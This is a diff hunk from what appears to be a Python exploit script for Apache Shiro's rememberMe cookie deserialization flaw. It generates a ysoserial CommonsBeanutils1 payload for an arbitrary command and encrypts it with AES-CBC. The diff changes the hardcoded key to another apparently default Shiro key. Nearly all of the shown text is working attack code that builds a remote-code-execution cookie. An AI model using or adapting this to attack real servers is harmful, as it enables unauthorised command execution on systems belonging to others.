@@ -13,7 +13,7 @@ def encode_rememberme(command):
     popen = subprocess.Popen(['java', '-jar', '../module/ysoserial.jar', 'CommonsBeanutils1', command], stdout=subprocess.PIPE)
     BS = AES.block_size
     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
-    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
+    key = base64.b64decode("4AvVhmFLUs0KTA3Kprsdag==")
     iv = uuid.uuid4().bytes
     encryptor = AES.new(key, AES.MODE_CBC, iv)
     file_body = pad(popen.stdout.read())
